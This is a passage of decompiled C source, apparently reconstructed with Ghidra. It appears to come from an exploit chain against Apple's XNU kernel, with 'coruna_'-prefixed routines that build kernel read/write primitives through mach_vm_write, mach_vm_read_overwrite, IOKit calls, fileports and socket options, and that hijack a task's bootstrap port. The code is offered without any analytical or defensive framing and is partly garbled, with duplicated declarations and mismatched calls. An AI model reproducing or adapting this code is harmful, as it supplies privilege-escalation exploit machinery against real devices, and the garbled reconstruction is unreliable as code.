      if ((*(int *)(&k_kernel_slot_1930 + handle) != -1) && (*(int *)(&k_kernel_slot_1934 + handle) != -1)) {
        if ((*(int *)(&k_kernel_slot_1940 + handle) != -1) && (*(long *)(handle + 0x218) != 0)) {
          coruna_fcntl_26e9c(handle,val,id_2,*(uint32_t *)(handle + 0x168),1);
          return;
        }
        if ((*(int *)(&k_kernel_slot_1938 + handle) != -1) && (*(int *)(&k_kernel_slot_193c + handle) != -1))
        {
          coruna_kernel509_via_kernel5_residual_238(handle,val,id_2,*(uint32_t *)(handle + 0x168),1);
          return;
        }
      }
      coruna_mach_vm_read_overwrite(*(uint32_t *)(&k_kernel_slot_1918 + handle),val,(long)*(int *)(handle + 0x168),
                   *(uint32_t *)(handle + 0x178),id_2,scratch);
    }
    else {
      coruna_ioconnectcallmethod_27ef0(handle,val,id_2,*(uint32_t *)(handle + 0x168),1);
    }
  }
  else {
    coruna_thread_get_state(handle,val,id_2,*(uint32_t *)(handle + 0x168),1);
  }
  return;
}
void coruna_kernel509_via_fn_ptr_cast_10_9(uint *size,uint64_t val)
{
  int err;
  
  err = coruna_fn_ptr_cast_10(size,0x5584001);
  if ((err != 0) && ((*size & 0x5584001) != 0)) {
    coruna_kernel509_via_fn_ptr_cast_10_11(size,val);
  }
  return;
}
void coruna_kernel509_via_fn_ptr_cast_10_10(uint64_t val,uint64_t id_2)
{
  int err;
  
  err = coruna_fn_ptr_cast_10(val,0x5584001);
  if (err != 0) {
    coruna_kernel509_via_fn_ptr_cast_10_11(val,id_2);
  }
  return;
}
void coruna_kernel509_via_fn_ptr_cast_10_11(uint64_t val,unsigned long arg)
{
  int err;
  
  if (((arg != 0) && ((arg >> 0x37 & 1) != 0)) &&
     (err = coruna_fn_ptr_cast_10(val,8), err == 0)) {
    coruna_fn_ptr_cast_10(val,0x5000000);
  }
  return;
}
void coruna_mach_vm_machine_attribute_2b20c(long handle,mach_vm_address_t arg,uint64_t val,int flags)
{
  int err;
  kern_return_t lk2;
  mach_vm_address_t *lpm3;
  long handle;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  
  scratch = val;
  if (*(long *)(handle + 0x40) != 0) {
    coruna_kernel509_via_helper_5d2c_419fc_2(handle,arg,&scratch,*(uint32_t *)(handle + 0x168),1);
  }
  thread_attr = val;
  if ((*(int *)(handle + 0xac) + 1U < 2) || (*(long *)(handle + 0xd8) == 0)) {
    if ((*(int *)(handle + 0xe8) + 1U < 2) ||
       ((*(long *)(handle + 0xf8) == 0 || (*(long *)(handle + 0x100) == 0)))) {
      if ((*(int *)(&k_kernel_slot_1930 + handle) != -1) && (*(int *)(&k_kernel_slot_1934 + handle) != -1)) {
        if ((*(int *)(&k_kernel_slot_1940 + handle) != -1) && (*(long *)(handle + 0x218) != 0)) {
          bootargs = val;
          if (flags == 0) {
            coruna_fcntl_1bf8c(handle,arg,&bootargs,*(uint32_t *)(handle + 0x168),1);
            return;
          }
          err = coruna_mach_absolute_time_1a9c0(handle,1,&k_kernel_slot_2710);
          if (err != 0) {
            return;
          }
          if (*(unsigned long *)(handle + 0x158) < 0x1f530000000000) {
            coruna_open_sepmgr_2ccac(handle,arg,val);
          }
          else {
            handle = *(long *)(handle + 0x28);
            if (((handle != 0) && (1 < *(semaphore_t *)(handle + 8) + 1)) &&
               (1 < *(int *)(handle + 0xc) + 1U)) {
              lpm3 = (mach_vm_address_t *)(handle + 0x20);
              *lpm3 = arg;
              *(uint64_t **)(handle + 0x28) = &thread_attr;
              *(uint64_t *)(handle + 0x30) = 8;
              lk2 = _semaphore_signal(*(semaphore_t *)(handle + 8));
              if ((lk2 == 0) &&
                 (_semaphore_timedwait(*(semaphore_t *)(handle + 0xc),(mach_timespec_t)0x3),
                 *(int *)(handle + 0x3c) != 0)) {
                *lpm3 = 0;
                *(uint64_t *)(handle + 0x28) = 0;
                *(uint64_t *)(handle + 0x30) = 0;
                coruna_semaphore_destroy(handle,0);
              }
              else {
                *lpm3 = 0;
                *(uint64_t *)(handle + 0x28) = 0;
                *(uint64_t *)(handle + 0x30) = 0;
              }
            }
          }
          if (*(long *)(handle + 0x118) == 0) {
            return;
          }
          if (*(long *)(handle + 0x120) == 0) {
            return;
          }
          *(uint32_t *)(*(long *)(handle + 0x118) + 1) = 0;
          return;
        }
        if ((*(int *)(&k_kernel_slot_1938 + handle) != -1) && (*(int *)(&k_kernel_slot_193c + handle) != -1))
        {
          coruna_kernel509_via_kernel5_residual_237(handle,arg,&scratch,*(uint32_t *)(handle + 0x168),1);
          return;
        }
      }
      _mach_vm_write(*(vm_map_t *)(&k_kernel_slot_1918 + handle),arg,(vm_offset_t)&scratch,
                     *(mach_msg_type_number_t *)(handle + 0x168));
      thread_attr = coruna_u64_pack((thread_attr), (7));
      _mach_vm_machine_attribute
                (*(vm_map_t *)(&k_kernel_slot_1918 + handle),arg,(long)*(int *)(handle + 0x168),1,
                 (vm_machine_attribute_val_t *)&thread_attr);
    }
    else {
      coruna_ioconnectcallmethod_1c8a8(handle,arg,&scratch,*(uint32_t *)(handle + 0x168),1);
    }
  }
  else if (*(long *)(&k_kernel_slot_1d48 + handle) != 0) {
    coruna_thread_switch_2a2c8(handle,arg,&thread_attr,*(uint32_t *)(handle + 0x168),1);
  }
  return;
}
void coruna_call_mach_vm_machine_attribute_1d4f8_2b508(void)
{
  coruna_mach_vm_machine_attribute_2b20c();
  return;
}
void coruna_kernel509_via_mach_port_deallocate_2b24c(long handle,unsigned long arg,uint64_t val)
{
  int err;
  uint8_t scratch[32];
  unsigned long bootargs;
  long thread_attr [8];
  
  thread_attr[6] = 0;
  thread_attr[3] = 0;
  thread_attr[2] = 0;
  thread_attr[5] = 0;
  thread_attr[4] = 0;
  thread_attr[1] = 0;
  thread_attr[0] = 0;
  err = coruna_call_mach_vm_machine_attribute_1d4f8_22818(handle,arg & (*(unsigned long *)(handle + 0x188) ^ 0xffffffffffffffff),
                       scratch);
  if (err != 0) {
    err = coruna_mach_make_memory_entry_2aed0(handle,bootargs & 0xffffffffc000,thread_attr);
    if (err == 0) {
      *(uint64_t *)((*(unsigned long *)(handle + 0x188) & arg) + thread_attr[0]) = val;
    }
    if (thread_attr[0] != 0) {
      coruna_mach_port_deallocate_2b24c(handle,thread_attr);
    }
  }
  return;
}
void coruna_call_mach_vm_machine_attribute_1d4f8_2b614(void)
{
  coruna_kernel509_via_kernel509_via_kernel5_residual_237();
  return;
}
void coruna_kernel509_residual_309(uint64_t val,int flags)
{
  uint8_t scratch[4];
  
  if ((flags != 0) && (-1 < flags)) {
    coruna_kernel509_via_fn_ptr_cast_10_25(val,0,scratch);
  }
  return;
}
void coruna_kernel509_via_fn_ptr_cast_10_12(long handle,unsigned long arg,uint *size)
{
  unsigned long u;
  int err;
  unsigned long size;
  uint version;
  long handle;
  
  err = coruna_fn_ptr_cast_10(handle,0x5584001);
  if (err == 0) {
    version = (uint)(ushort)(arg >> 0x30);
    if ((arg & 0x800000000000) != 0) {
      version = (uint)((arg >> 0x30) << 0xe);
    }
    *size = version;
  }
  else {
    err = coruna_fn_ptr_cast_10(handle,8);
    if ((err == 0) && (err = coruna_fn_ptr_cast_10(handle,0x5000000), err == 0)) {
      size = *(unsigned long *)(handle + 0x158);
      handle = 0x25;
      if (0x225814018fffff < size) {
        handle = 0x26;
      }
    }
    else {
      size = *(unsigned long *)(handle + 0x158);
      handle = 0x2d;
      if (0x225814018fffff < size) {
        handle = 0x2e;
      }
    }
    u = 3;
    if (0x225814018fffff < size) {
      u = 1;
    }
    u = u & arg >> handle;
    if (u == 0) {
      version = ((uint)arg & 0x3fff) << 0xe;
    }
    else {
      if (0x225814018fffff < size) {
        u = arg & 0x10 | 0x20;
      }
      version = (uint)(u << (arg & 0xf));
    }
    *size = version;
  }
  return;
}
void coruna_kernel509_via_mach_vm_read_overwrite_3(long handle,uint64_t val,uint64_t id_2,uint64_t size_3)
{
  if (*(long *)(handle + 0x30) != 0) {
    coruna_kernel509_via_helper_5d2c_419fc_2(handle,val,size_3,id_2);
  }
  if ((*(int *)(handle + 0xac) + 1U < 2) || (*(long *)(handle + 0xd8) == 0)) {
    if ((*(int *)(handle + 0xe8) + 1U < 2) ||
       ((*(long *)(handle + 0xf8) == 0 || (*(long *)(handle + 0x100) == 0)))) {
      if ((*(int *)(&k_kernel_slot_1930 + handle) != -1) && (*(int *)(&k_kernel_slot_1934 + handle) != -1)) {
        if ((*(int *)(&k_kernel_slot_1940 + handle) != -1) && (*(long *)(handle + 0x218) != 0)) {
          coruna_fcntl_26e9c(handle,val,size_3,id_2);
          return;
        }
        if ((*(int *)(&k_kernel_slot_1938 + handle) != -1) && (*(int *)(&k_kernel_slot_193c + handle) != -1))
        {
          coruna_kernel509_via_kernel5_residual_238(handle,val,size_3,id_2);
          return;
        }
      }
      coruna_mach_vm_read_overwrite(*(uint32_t *)(&k_kernel_slot_1918 + handle),val,id_2,
                   *(uint32_t *)(handle + 0x178),size_3,0);
    }
    else {
      coruna_ioconnectcallmethod_27ef0(handle,val,size_3,id_2);
    }
  }
  else {
    coruna_thread_get_state(handle,val,size_3,id_2);
  }
  return;
}
void coruna_call_mach_vm_machine_attribute_1d4f8_2b9a4(void)
{
  coruna_kernel509_via_mach_vm_read_overwrite_3();
  return;
}
void coruna_kernel509_via_kernel509_via_kernel5_residual_237(long handle)
{
  if (*(long *)(handle + 0x40) != 0) {
    coruna_kernel509_via_helper_5d2c_419fc_2();
  }
  if ((*(int *)(handle + 0xac) + 1U < 2) || (*(long *)(handle + 0xd8) == 0)) {
    if ((*(int *)(handle + 0xe8) + 1U < 2) ||
       ((*(long *)(handle + 0xf8) == 0 || (*(long *)(handle + 0x100) == 0)))) {
      if ((*(int *)(&k_kernel_slot_1930 + handle) != -1) && (*(int *)(&k_kernel_slot_1934 + handle) != -1)) {
        if ((*(int *)(&k_kernel_slot_1940 + handle) != -1) && (*(long *)(handle + 0x218) != 0)) {
          coruna_fcntl_1bf8c();
          return;
        }
        if ((*(int *)(&k_kernel_slot_1938 + handle) != -1) && (*(int *)(&k_kernel_slot_193c + handle) != -1))
        {
          coruna_kernel509_via_kernel5_residual_237();
          return;
        }
      }
      coruna_mach_vm_machine_attribute_1e01c(*(uint32_t *)(&k_kernel_slot_1918 + handle));
    }
    else {
      coruna_ioconnectcallmethod_1c8a8();
    }
  }
  else {
    coruna_thread_switch_2a2c8();
  }
  return;
}
void coruna_call_mach_vm_machine_attribute_1d4f8_2bae8(void)
{
  coruna_kernel509_via_kernel509_via_kernel5_residual_237();
  return;
}
void coruna_kernel509_via_fn_ptr_cast_10_13(long handle,long addr_2,uint64_t val)
{
  int err;
  uint32_t scratch;
  
  scratch = (uint32_t)val;
  if (0x1f530f027fffff < *(unsigned long *)(handle + 0x158)) {
    err = coruna_fn_ptr_cast_10(handle,0x5184001);
    if (err != 0) {
      coruna_vm_deallocate_112cc(handle,addr_2,&scratch,4);
      return;
    }
    addr_2 = coruna_kernel509_via_helper_2abf4_39b14(handle,addr_2);
    if (addr_2 == 0) {
      return;
    }
  }
  coruna_mach_vm_machine_attribute(handle,addr_2,val);
  return;
}
void coruna_kernel509_via_fn_ptr_cast_10_14(long handle,long addr_2,uint64_t val)
{
  uint8_t u;
  int err;
  
  if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
    u = *(uint8_t *)(handle + 0xc);
  }
  else {
    err = coruna_fn_ptr_cast_10(handle,0x5184001);
    if (err != 0) {
      coruna_kernel509_via_fn_ptr_cast_10_5(handle,addr_2,val);
      return;
    }
    addr_2 = coruna_kernel509_via_helper_2abf4_39b14(handle,addr_2);
    if (addr_2 == 0) {
      return;
    }
    u = *(uint8_t *)(handle + 0xc);
  }
  coruna_mach_vm_machine_attribute_2b20c(handle,addr_2,val,u);
  return;
}
void coruna_kernel509_via_fn_ptr_cast_10_15(long handle,long addr_2,uint64_t val,uint64_t id_2)
{
  int err;
  
  if (0x1f530f027fffff < *(unsigned long *)(handle + 0x158)) {
    err = coruna_fn_ptr_cast_10(handle,0x5184001);
    if (err != 0) {
      coruna_vm_deallocate_112cc(handle,addr_2,val,id_2);
      return;
    }
    addr_2 = coruna_kernel509_via_helper_2abf4_39b14(handle,addr_2);
    if (addr_2 == 0) {
      return;
    }
  }
  coruna_kernel509_via_kernel509_via_kernel5_residual_237(handle,addr_2,val,id_2,1);
  return;
}
void coruna_mach_vm_machine_attribute_1e01c(vm_map_t arg,mach_vm_address_t arg_x,long handle,uint size,uint flags_2)
{
  uint u;
  uint dataCnt;
  kern_return_t lk2;
  long handle;
  uint size;
  vm_machine_attribute_val_t scratch;
  
  u = size;
  if (flags_2 != 0) {
    u = flags_2;
  }
  if (size != 0) {
    handle = 0;
    size = size;
    do {
      dataCnt = size;
      if (u <= size) {
        dataCnt = u;
      }
      lk2 = _mach_vm_write(arg,handle + arg_x,handle + handle,dataCnt);
      if (lk2 != 0) {
        return;
      }
      handle = handle + (unsigned long)dataCnt;
      size = size - dataCnt;
    } while (size != 0);
  }
  scratch = 7;
  _mach_vm_machine_attribute(arg,arg_x,(unsigned long)size,1,&scratch);
  return;
}
void coruna_mach_port_get_attributes(long handle)
{
  mach_port_name_t name;
  uint8_t *ptr;
  uint8_t *buf;
  int err;
  kern_return_t lk4;
  long handle;
  unsigned long u;
  mach_msg_type_number_t scratch;
  integer_t bootargs [3];
  int thread_attr;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t host_info;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t serial_buf;
  uint32_t serial_buf;
  mach_msg_type_number_t action;
  ipc_info_tree_name_array_t block_ctx;
  mach_msg_type_number_t stack_guard;
  ipc_info_name_array_t sa_saved;
  ipc_info_space_t sa_new;
  ipc_space_t path_buf;
  
  if ((handle != 0) && (*(int *)k_kernel_bootstrap_port_slot + 1U < 2)) {
    path_buf = 0;
    err = coruna_call_macho_data_seg_25b54_3d1c8(handle,1,&path_buf);
    if (err != 0) {
      sa_new.iis_genno_mask = 0;
      sa_new.iis_table_size = 0;
      sa_new.iis_table_next = 0;
      sa_new.iis_tree_size = 0;
      sa_new.iis_tree_small = 0;
      sa_new.iis_tree_hash = 0;
      sa_saved = (ipc_info_name_array_t)0x0;
      stack_guard = 0;
      block_ctx = (ipc_info_tree_name_array_t)0x0;
      action = 0;
      lk4 = _mach_port_space_info(path_buf,&sa_new,&sa_saved,&stack_guard,&block_ctx,&action);
      buf = k_kernel_mach_task_self_slot;
      if ((lk4 == 0) && (stack_guard != 0)) {
        handle = 0;
        u = 0;
        do {
          serial_buf = 0;
          thread_attr = 0;
          host_info = 0;
          serial_buf = 0;
          host_info = 0;
          ghidra_stack_4 = 0;
          bootargs[0] = 0;
          bootargs[1] = 0;
          bootargs = 0;
          scratch = 0;
          scratch = 0x11;
          if (((((*(byte *)((long)&sa_saved->iin_type + handle + 2) & 0x1f) != 0) &&
               (name = *(mach_port_name_t *)((long)&sa_saved->iin_name + handle), 1 < name + 1)) &&
              (lk4 = _mach_port_get_attributes(path_buf,name,7,bootargs,&scratch), lk4 == 0))
             && ((thread_attr == 0x80 && ((~host_info & 6) == 0)))) {
            if ((1 < *(int *)((long)&sa_saved->iin_name + handle) + 1U) &&
               ((handle = coruna_kernel509_via_kernel5_via_mach_ports_register(handle,path_buf), ptr = k_kernel_bootstrap_port_slot,
                handle != 0 &&
                (err = coruna_mach_port_request_notification(handle,handle,k_kernel_bootstrap_port_slot), err == 0)))) {
              _task_set_special_port(*(task_t *)buf,4,*(mach_port_t *)ptr);
            }
            break;
          }
          u = u + 1;
          handle = handle + 0x1c;
        } while (u < stack_guard);
      }
      if ((sa_saved != (ipc_info_name_array_t)0x0) && (stack_guard != 0)) {
        _mach_vm_deallocate(*(vm_map_t *)buf,(mach_vm_address_t)sa_saved,(unsigned long)stack_guard * 0x1c);
      }
      if ((block_ctx != (ipc_info_tree_name_array_t)0x0) && (action != 0)) {
        _mach_vm_deallocate(*(vm_map_t *)buf,(mach_vm_address_t)block_ctx,(unsigned long)action * 0x24);
      }
      _mach_port_deallocate(*(ipc_space_t *)buf,path_buf);
    }
  }
  return;
}
void coruna_semaphore_timedwait(long handle,uint size)
{
  _semaphore_timedwait
            (*(semaphore_t *)(handle + 0x264),
             (mach_timespec_t)
             ((unsigned long)size / 1000000 | (unsigned long)((size % 1000000) * 1000 >> 3) << 0x23));
  return;
}
void coruna_helper_1249c_2c0fc(void)
{
  return;
}
void coruna_mach_port_deallocate_1e398(long handle)
{
  int err;
  int status;
  uint u;
  int *err;
  uint *ptr;
  long handle;
  long addr;
  sockaddr scratch;
  uint64_t scratch;
  uint64_t bootargs;
  long bootargs;
  mach_port_name_t thread_attr;
  
  addr = *(long *)(handle + 0x28);
  if (addr == 0) {
    return;
  }
  thread_attr = 0;
  err = _socket(0x20,2,2);
  if (-1 < err) {
    scratch.sa_data[6] = '\0';
    scratch.sa_data[7] = '\0';
    scratch.sa_data[8] = '\0';
    scratch.sa_data[9] = '\0';
    scratch.sa_data[10] = '\0';
    scratch.sa_data[0xb] = '\0';
    scratch.sa_data[0xc] = '\0';
    scratch.sa_data[0xd] = '\0';
    bootargs = 0;
    scratch = 0;
    scratch.sa_len = '\0';
    scratch.sa_family = '\0';
    scratch.sa_data[0] = '\0';
    scratch.sa_data[1] = '\0';
    scratch.sa_data[2] = '\x02';
    scratch.sa_data[3] = '\0';
    scratch.sa_data[4] = '\0';
    scratch.sa_data[5] = '\0';
    status = _connect(err,&scratch,0x20);
    if ((status == 0) && (status = coruna_fileport_makeport(err,&thread_attr), status == 0)) {
      u = coruna_kernel509_via_kernel509_via_kernel509_via_fn_ptr_cast_2_4_4(handle,thread_attr,&bootargs);
      if (u == 0) {
        status = coruna_kernel509_residual_307(handle,bootargs + 0x10,&bootargs);
        u = 0x2800f;
        if (status != 0) {
          handle = coruna_fn_ptr_cast_2(handle,bootargs);
          if (handle != 0) {
            status = coruna_kernel509_residual_307(handle,bootargs + 0x30,&bootargs);
            u = 0x2800f;
            if (status == 0) goto fail;
            handle = coruna_fn_ptr_cast_2(handle,bootargs);
            if (handle != 0) {
              u = 0;
              *(int *)(addr + 0x10) = err;
              *(long *)(addr + 0x18) = bootargs;
              goto fail;
            }
          }
          u = 0x28026;
        }
      }
      goto fail;
    }
  }
  err = ___error();
  status = *err;
  ptr = (uint *)___error();
  u = -*ptr;
  if (-1 < status) {
    u = *ptr;
  }
  u = u | 0x40000000;
fail:
  if (1 < thread_attr + 1) {
    _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,thread_attr);
    thread_attr = 0;
  }
  if (u == 0 || err == -1) {
    *(uint *)(addr + 0x3c) = u;
    if (u == 0) {
      u = 0xad001;
      do {
        err = ___semwait_signal(*(uint32_t *)(addr + 8),*(uint32_t *)(addr + 0xc),0,0,0,0);
        if (err != 0) {
done:
          err = ___error();
          err = *err;
          ptr = (uint *)___error();
          u = -*ptr;
          if (-1 < err) {
            u = *ptr;
          }
          u = u | 0x40000000;
          goto cleanup;
        }
        if (*(char *)(addr + 0x38) != '\0') {
          u = 0;
          goto cleanup;
        }
        if (((*(long *)(addr + 0x20) == 0) || (*(long *)(addr + 0x28) == 0)) ||
           (*(long *)(addr + 0x30) != 8)) goto cleanup;
        scratch = *(long *)(addr + 0x20) + -0x30;
        err = coruna_kernel509_via_kernel509_via_kernel5_residual_237(handle,*(long *)(addr + 0x18) + 8,&scratch,
                             *(uint32_t *)(handle + 0x168),1);
        if (err == 0) break;
        bootargs = **(long **)(addr + 0x28);
        err = _setsockopt(*(int *)(addr + 0x10),2,0x10,&bootargs,8);
        if (err != 0) {
          err = ___error();
          err = *err;
          ptr = (uint *)___error();
          u = -*ptr;
          if (-1 < err) {
            u = *ptr;
          }
          u = u | 0x40000000;
          goto cleanup;
        }
        scratch.sa_len = '\0';
        scratch.sa_family = '\0';
        scratch.sa_data[0] = '\0';
        scratch.sa_data[1] = '\0';
        scratch.sa_data[2] = '\0';
        scratch.sa_data[3] = '\0';
        scratch.sa_data[4] = '\0';
        scratch.sa_data[5] = '\0';
        err = coruna_kernel509_via_kernel509_via_kernel5_residual_237(handle,*(long *)(addr + 0x18) + 8,&scratch,
                             *(uint32_t *)(handle + 0x168),1);
      } while (err != 0);
      u = 0x28010;
cleanup:
      *(uint *)(addr + 0x3c) = u;
      if (*(char *)(addr + 0x38) != '\0') {
        return;
      }
    }
  }
  else {
    _close(err);
    *(uint *)(addr + 0x3c) = u;
  }
  _semaphore_signal(*(semaphore_t *)(addr + 0xc));
  return;
}
void coruna_semaphore_wait(semaphore_t arg)
{
  _semaphore_wait(arg);
  return;
}
void coruna_semaphore_wait_2c404(long *handle)
{
  pthread_mutex_t *ptr;
  unsigned long u;
  semaphore_t semaphore;
  bool err;
  int err;
  uint size;
  uint version;
  kern_return_t lk7;
  pthread_t p_Var8;
  bool status;
  long handle;
  vm_address_t lv11;
  unsigned long port;
  long addr;
  long off;
  unsigned long size;
  bool flags;
  long base;
  uint tag;
  unsigned long kind;
  vm_inherit_t in_stack_ffffffffffffff90;
  vm_address_t scratch;
  
  semaphore = *(semaphore_t *)(handle + 0x11);
  ptr = (pthread_mutex_t *)(handle + 4);
  base = handle[0xd];
  if (base == 0) {
    flags = false;
    status = false;
    addr = *handle;
    tag = 0;
    do {
      if ((status) && (err = _pthread_mutex_unlock(ptr), err != 0)) {
fail:
        *(int *)(handle + 0xf) = (int)handle[0xf] + 1;
        goto done;
      }
      if (tag != 0) {
        _thread_switch(0,2,1);
      }
      err = _pthread_mutex_lock(ptr);
      if (err != 0) {
        *(int *)(handle + 0xf) = (int)handle[0xf] + 1;
        if (flags) {
        _semaphore_wait(semaphore);
        }
        return;
      }
      if (((handle[0xd] == 0) && (size = coruna_kernel509_residual_299(), size < *(uint *)(handle + 2))) &&
         (handle = *(long *)(handle[1] + (unsigned long)size * 8), handle != 0)) {
        off = *(long *)(handle + (unsigned long)*(uint *)((long)handle + 0x14));
        handle = coruna_fn_ptr_cast_2(addr,off);
        if ((handle != 0) && (version = coruna_kernel509_residual_299(), size == version)) {
          u = off + (unsigned long)*(uint *)(handle + 0xc);
          kind = u & (*(unsigned long *)(addr + 0x188) ^ 0xffffffffffffffff);
          if ((handle[3] != 0) && (kind == handle[3])) goto fail;
          handle = coruna_kernel5_residual_225(addr,u);
          if (handle == 0) {
check_ok:
            handle[3] = kind;
            goto fail;
          }
          if ((*(vm_address_t *)(addr + 0x90) == 0) ||
             (size = *(unsigned long *)(addr + 0x98), lv11 = *(vm_address_t *)(addr + 0x90), size == 0
             )) {
            scratch = 0;
            if ((*(mem_entry_name_port_t *)(addr + 0x58) + 1 < 2) ||
               (((*(vm_offset_t *)(addr + 0x80) == 0 ||
                 (size = (unsigned long)*(uint *)(addr + 0x88), *(uint *)(addr + 0x88) == 0)) ||
                (lk7 = _vm_map(*(vm_map_t *)k_kernel_mach_task_self_slot,&scratch,size,0,1,
                                 *(mem_entry_name_port_t *)(addr + 0x58),
                                 *(vm_offset_t *)(addr + 0x80),0,1,1,in_stack_ffffffffffffff90),
                lk7 != 0)))) goto check_ok;
            *(vm_address_t *)(addr + 0x90) = scratch;
            *(unsigned long *)(addr + 0x98) = size;
            lv11 = scratch;
          }
          port = 0;
          handle = *(long *)(addr + 0x80);
          size = *(uint *)(addr + 0x88);
          while ((*(int *)(lv11 + ((int)port + 0x20)) == 0 ||
                 (*(unsigned long *)(lv11 + ((int)port + 0x18)) != kind))) {
            port = port + 0x30;
            if (size <= (port & 0xffffffff)) goto check_ok;
          }
          off = *(long *)k_kernel_vm_page_size_slot;
          version = *(uint *)k_kernel_vm_page_shift_slot;
          kind = *(unsigned long *)(addr + 0x188);
          p_Var8 = _pthread_self();
          handle[0xd] = (long)p_Var8;
          handle[0xe] = (kind & u) +
                         ((((handle + (unsigned long)size + off) - 1 & -off) >> ((unsigned long)version & 0x3f)
                          ) + port / 0x30) * off;
          flags = true;
        }
      }
      if (handle[0xd] != 0) break;
      status = true;
      err = tag < 0xf;
      tag = tag + 1;
    } while (err);
  }
  else {
    flags = false;
  }
  *(int *)(handle + 0xf) = (int)handle[0xf] + 1;
  if (base == 0) {
done:
    _pthread_mutex_unlock(ptr);
  }
cleanup:
  if (flags) {
    _semaphore_wait(semaphore);
  }
  return;
}
void coruna_kernel509_residual_310(long handle)
{
  bool err;
  int err;
  int *err;
  uint u;
  
  ___error();
  *(uint8_t *)(handle + 0x49) = 1;
  u = 0;
fail:
  do {
    err = ___ulock_wait(0x10001,(uint32_t *)(handle + 0x34),0,*(uint32_t *)(handle + 0x34));
    if (err == 0) {
      *(long *)(handle + 0x40) = *(long *)(handle + 0x40) + 1;
    }
    else {
      if (((err == -1) && (err = ___error(), *err == 4)) &&
         (err = u < 100, u = u + 1, err)) goto fail;
      err = ___error();
      if (*err != 0xe) {
        return;
      }
    }
    u = 0;
    if (*(char *)(handle + 0x48) != '\0') {
      return;
    }
  } while( true );
}
void coruna_ioconnectcallscalarmethod_2c778(byte *arg,uint64_t val,long handle)
{
  long handle;
  long addr;
  long off;
  long base;
  int err;
  int status;
  long ctx_val;
  uint64_t u;
  long serial;
  long serial_7;
  long serial_8;
  unsigned long size;
  long scratch;
  long bootargs;
  unsigned long thread_attr [3];
  uint32_t host_info;
  uint64_t serial_buf;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t action;
  uint64_t host_info;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t block_ctx;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t sa_saved;
  uint64_t stack_guard;
  uint64_t sa_new;
  uint64_t path_buf;
  uint64_t tmp_buf;
  uint64_t sa_saved;
  uint64_t region;
  uint64_t plist;
  uint64_t url_buf;
  uint64_t sa_new;
  uint64_t json_buf;
  uint64_t frame;
  uint64_t work;
  uint64_t path_buf;
  uint64_t cache;
  uint64_t cache_20;
  uint64_t cache_21;
  uint64_t tmp_buf;
  uint64_t cache_22;
  uint64_t cache_23;
  uint64_t cache_24;
  uint8_t region[12];
  uint64_t cache_25;
  uint64_t plist;
  uint64_t cache_26;
  uint64_t url_buf;
  uint64_t cache_27;
  uint64_t json_buf;
  uint64_t cache_28;
  uint64_t frame;
  uint64_t cache_29;
  uint64_t work;
  uint64_t cache_30;
  uint64_t cache;
  uint64_t cache_31;
  uint64_t cache_20;
  uint64_t cache_32;
  uint64_t cache_21;
  uint64_t cache_33;
  uint64_t cache_22;
  uint64_t cache_34;
  uint64_t cache_23;
  uint64_t cache_35;
  uint64_t cache_24;
  uint64_t cache_36;
  uint64_t cache_25;
  uint64_t cache_37;
  uint64_t cache_26;
  uint64_t cache_38;
  uint64_t cache_39;
  uint32_t cache_40;
  uint32_t cache_27;
  uint32_t cache_41;
  uint64_t cache_42;
  long cache_28;
  
  cache_28 = *(long *)k_kernel_stack_chk_guard_slot;
  thread_attr[2] = 0;
  ctx_val = *(long *)(arg + 0x1d48);
  if ((((ctx_val != 0) && (err = *(int *)(ctx_val + 0x70), 1 < err + 1U)) &&
      (serial = *(long *)(ctx_val + 0x58), serial != 0)) &&
     (((serial_7 = *(long *)(ctx_val + 0x60), serial_7 != 0 &&
       (serial_8 = *(long *)(ctx_val + 0x68), serial_8 != 0)) &&
      (ctx_val = *(long *)(ctx_val + 0x50), ctx_val != 0)))) {
    u = *(uint64_t *)k_kernel_vm_page_size_slot;
    cache_42 = 0;
    cache_41 = 0;
    cache_40 = 0;
    cache_27 = 0;
    cache_39 = 0;
    cache_38 = 0;
    cache_26 = 0;
    cache_37 = 0;
    cache_25 = 0;
    cache_36 = 0;
    cache_24 = 0;
    cache_35 = 0;
    cache_23 = 0;
    cache_34 = 0;
    cache_22 = 0;
    cache_33 = 0;
    cache_21 = 0;
    cache_32 = 0;
    cache_20 = 0;
    cache_31 = 0;
    cache = 0;
    cache_30 = 0;
    work = 0;
    cache_29 = 0;
    frame = 0;
    cache_28 = 0;
    json_buf = 0;
    cache_27 = 0;
    url_buf = 0;
    cache_26 = 0;
    plist = 0;
    cache_25 = 0;
    region = 0;
    region = 0x80;
    status = *(int *)(arg + 0x140);
    handle = 0x30;
    if (status < 0x225c) {
      handle = 0x28;
    }
    addr = 0x38;
    if (status < 0x225c) {
      addr = 0x30;
    }
    off = 0x40;
    if (status < 0x225c) {
      off = 0x38;
    }
    base = 0x48;
    if (status < 0x225c) {
      base = 0x40;
    }
    *(uint64_t *)(region + handle) = u;
    *(long *)(region + addr) = ctx_val;
    *(long *)(region + off) = ctx_val;
    *(uint64_t *)(region + base) = u;
    cache_22 = 0;
    tmp_buf = 0;
    cache_24 = 0;
    cache_23 = 0;
    cache = 0;
    path_buf = 0;
    cache_21 = 0;
    cache_20 = 0;
    json_buf = 0;
    sa_new = 0;
    work = 0;
    frame = 0;
    region = 0;
    sa_saved = 0;
    url_buf = 0;
    plist = 0;
    sa_new = 0;
    stack_guard = 0;
    tmp_buf = 0;
    path_buf = 0;
    block_ctx = 0;
    block_ctx = 0;
    sa_saved = 0;
    stack_guard = 0;
    host_info = 0;
    action = 0;
    action = 0;
    serial_buf = 0;
    scratch = 0;
    serial_buf = 0;
    thread_attr = 0;
    bootargs = 0;
    thread_attr[1] = 0x100;
    status = _IOConnectCallStructMethod(err,9,region,0x100,&serial_buf,thread_attr + 1);
    if (status == 0) {
      size = (unsigned long)thread_attr;
      if ((thread_attr - 1 < 0x3ff) &&
         (status = coruna_kernel509_via_mach_vm_read_overwrite_3(arg,serial_8 + (unsigned long)(*(int *)(arg + 0x168) * thread_attr
                                                       ),(long)*(int *)(arg + 0x168),
                               thread_attr + 2,0), status != 0)) {
        thread_attr[2] = coruna_kernel509_via_fn_ptr_cast_10_9(arg,thread_attr[2]);
